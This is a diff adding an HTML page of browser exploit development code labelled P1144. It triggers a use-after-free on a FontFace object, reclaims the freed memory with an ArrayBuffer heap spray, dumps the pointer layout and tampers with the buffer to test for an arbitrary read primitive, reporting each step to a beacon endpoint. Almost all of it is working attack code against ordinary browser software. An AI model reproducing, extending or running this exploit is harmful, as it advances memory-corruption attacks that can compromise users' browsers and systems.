@@ -1,0 +1,188 @@
+<!DOCTYPE html><html><head><meta charset="utf-8"><title>P1144</title>
+<style>*{margin:0;padding:0;box-sizing:border-box}body{background:#0a0a0f;color:#c8ffc8;font:11px/1.4 monospace;padding:10px;min-height:100vh}#log{white-space:pre-wrap;word-break:break-all}.ok{color:#6f6}.fail{color:#f66}.ptr{color:#f6f}.info{color:#6cf}.phase{color:#fff;font-size:13px;font-weight:bold;margin:6px 0}.win{color:#0f0;font-weight:bold;font-size:14px}</style>
+</head><body><div id="log"></div>
+<script>
+var L=document.getElementById('log');
+function log(c,m){var d=document.createElement('div');d.className=c;d.textContent=m;L.appendChild(d);}
+function B(t,d){try{new Image().src='/beacon.php?tag='+encodeURIComponent(t)+'&data='+encodeURIComponent(d||'')+'&_='+Math.random();}catch(e){}}
+function hex64(v){if(typeof v==='bigint'){var s=v.toString(16);while(s.length<16)s='0'+s;return'0x'+s;}return'0x0';}
+
+log('phase','=== P1144: POST-UAF FONTFACE ACCESS ===');
+log('info','After UAF reclaim, does ff.family read from our controlled buffer?');
+log('info','If yes: we control what the engine reads -> arbitrary read primitive!');
+B('P1144-START','t='+Date.now());
+
+var r=Date.now()%100000;
+var uafHit=false;
+var sprayBufs=[];
+var savedFF=null;  // Keep reference to the FontFace wrapper
+
+var st=document.createElement('style');
+st.textContent="@font-face{font-family:z"+r+";src:local(Arial);unicode-range:U+0042}";
+document.head.appendChild(st);
+var ff=new FontFace('y'+r,'local(Helvetica)',{unicodeRange:'U+0041'});
+document.fonts.add(ff);void ff.loaded;
+savedFF=ff;  // Save reference for post-UAF access
+
+log('ok','FontFace created: family=y'+r);
+B('P1144-FF','family=y'+r);
+
+// Pre-UAF: read properties while still valid
+var preFamily='?',preStatus='?',preWeight='?',preRange='?',preStyle='?';
+try{preFamily=savedFF.family;}catch(e){preFamily='ERR:'+e.message;}
+try{preStatus=savedFF.status;}catch(e){preStatus='ERR:'+e.message;}
+try{preWeight=savedFF.weight;}catch(e){preWeight='ERR:'+e.message;}
+try{preRange=savedFF.unicodeRange;}catch(e){preRange='ERR:'+e.message;}
+try{preStyle=savedFF.style;}catch(e){preStyle='ERR:'+e.message;}
+log('info','PRE: family='+preFamily+' status='+preStatus+' weight='+preWeight);
+B('P1144-PRE','f='+preFamily+'|s='+preStatus+'|w='+preWeight+'|r='+preRange+'|st='+preStyle);
+
+Object.defineProperty(FontFace.prototype,'then',{configurable:true,get:function(){
+  if(uafHit)return undefined;uafHit=true;
+
+  // Free CSSFontFace
+  if(st.parentNode)st.remove();
+  try{document.fonts.delete(this);}catch(e){}
+  document.body.offsetHeight;
+
+  // Spray at 192 bytes (CSSFontFace size)
+  for(var k=0;k<60;k++) sprayBufs.push(new ArrayBuffer(192));
+
+  return undefined;
+},set:function(){}});
+
+document.fonts.load('1em y'+r+', z'+r,'AB').then(function(){},function(){});
+
+setTimeout(function(){
+  delete FontFace.prototype.then;
+  log('phase','--- UAF done, checking reclaim ---');
+
+  // Find the reclaimed buffer
+  var reclaimIdx=-1;
+  var reclaimView=null;
+  for(var k=0;k<sprayBufs.length;k++){
+    var v=new BigUint64Array(sprayBufs[k]);
+    var hasNZ=false;
+    for(var q=0;q<v.length;q++){if(v[q]!==0n){hasNZ=true;break;}}
+    if(hasNZ){
+      reclaimIdx=k;
+      reclaimView=v;
+      break;
+    }
+  }
+
+  if(reclaimIdx<0){
+    log('fail','No reclaim found');
+    B('P1144-DONE','reclaim=false');
+    return;
+  }
+
+  // Dump the reclaimed CSSFontFace
+  var dump=[];
+  for(var q=0;q<reclaimView.length;q++){
+    dump.push('q'+q+'='+hex64(reclaimView[q]));
+  }
+  log('ok','Reclaimed at idx='+reclaimIdx);
+  log('ptr','Layout: '+dump.slice(0,8).join(' '));
+  log('ptr','Layout: '+dump.slice(8,16).join(' '));
+  log('ptr','Layout: '+dump.slice(16,24).join(' '));
+  B('P1144-LAYOUT-A',dump.slice(0,8).join('|'));
+  B('P1144-LAYOUT-B',dump.slice(8,16).join('|'));
+  B('P1144-LAYOUT-C',dump.slice(16,24).join('|'));
+
+  // ===== THE KEY TEST: Access properties AFTER UAF =====
+  log('phase','--- Post-UAF property access ---');
+
+  var results={};
+  var props=['family','style','weight','stretch','unicodeRange','variant',
+             'featureSettings','display','status','loaded'];
+
+  for(var pi=0;pi<props.length;pi++){
+    var pname=props[pi];
+    try{
+      var val=savedFF[pname];
+      var valStr=''+val;
+      if(valStr.length>80) valStr=valStr.substring(0,80)+'...';
+      results[pname]='OK:'+valStr;
+      log('ok','ff.'+pname+' = '+valStr);
+    }catch(e){
+      results[pname]='ERR:'+e.message;
+      log('fail','ff.'+pname+' threw: '+e.message);
+    }
+  }
+
+  B('P1144-POST-1','family='+results.family+'|status='+results.status+'|weight='+results.weight);
+  B('P1144-POST-2','style='+results.style+'|range='+results.unicodeRange+'|display='+results.display);
+  B('P1144-POST-3','loaded='+results.loaded+'|variant='+results.variant+'|feat='+results.featureSettings);
+
+  // ===== TEST: Modify the buffer, then re-read properties =====
+  log('phase','--- Modify buffer + re-read ---');
+
+  // Save original values
+  var origQ=[];
+  for(var q=0;q<reclaimView.length;q++) origQ.push(reclaimView[q]);
+
+  // Write recognizable pattern into q1-q10 (leave q0=refcount alone)
+  // This tests if property reads actually use these offsets
+  reclaimView[1]=0xDEAD0001BEEF0001n;
+  reclaimView[2]=0xDEAD0002BEEF0002n;
+  reclaimView[3]=0xDEAD0003BEEF0003n;
+
+  var modResults={};
+  for(var pi=0;pi<props.length;pi++){
+    var pname=props[pi];
+    try{
+      var val=savedFF[pname];
+      var valStr=''+val;
+      if(valStr.length>80) valStr=valStr.substring(0,80)+'...';
+      modResults[pname]='OK:'+valStr;
+      log('ok','MOD ff.'+pname+' = '+valStr);
+    }catch(e){
+      modResults[pname]='ERR:'+e.message;
+      log('fail','MOD ff.'+pname+' threw: '+e.message);
+    }
+  }
+
+  // Check what changed
+  var changed=[];
+  for(var pi=0;pi<props.length;pi++){
+    var pname=props[pi];
+    if(results[pname]!==modResults[pname]) changed.push(pname);
+  }
+
+  B('P1144-MOD-1','family='+modResults.family+'|status='+modResults.status);
+  B('P1144-MOD-2','changed='+changed.join(','));
+
+  // Restore original values to avoid crash
+  for(var q=0;q<origQ.length;q++) reclaimView[q]=origQ[q];
+
+  // ===== TEST: Write zero to refcount, see if property access crashes =====
+  log('phase','--- Zero refcount test ---');
+  reclaimView[0]=0n;  // refcount = 0
+  var zeroResults={};
+  for(var pi=0;pi<props.length;pi++){
+    var pname=props[pi];
+    try{
+      var val=savedFF[pname];
+      zeroResults[pname]='OK:'+((''+val).substring(0,40));
+    }catch(e){
+      zeroResults[pname]='ERR:'+e.message;
+    }
+  }
+  B('P1144-ZERO','family='+zeroResults.family+'|status='+zeroResults.status);
+
+  // Restore
+  for(var q=0;q<origQ.length;q++) reclaimView[q]=origQ[q];
+
+  log('phase','=== DONE ===');
+  if(changed.length>0){
+    log('win','!!! PROPERTIES CHANGED AFTER BUFFER MODIFY: '+changed.join(', ')+' !!!');
+    log('win','This means the engine reads from our controlled buffer!');
+    log('win','ARBITRARY READ primitive is possible!');
+  }else{
+    log('info','No properties changed. Engine may cache values or use a different path.');
+  }
+
+  B('P1144-DONE','reclaim=true|changed='+changed.length+'|list='+changed.join(','));
+},25);
+</script></body></html>
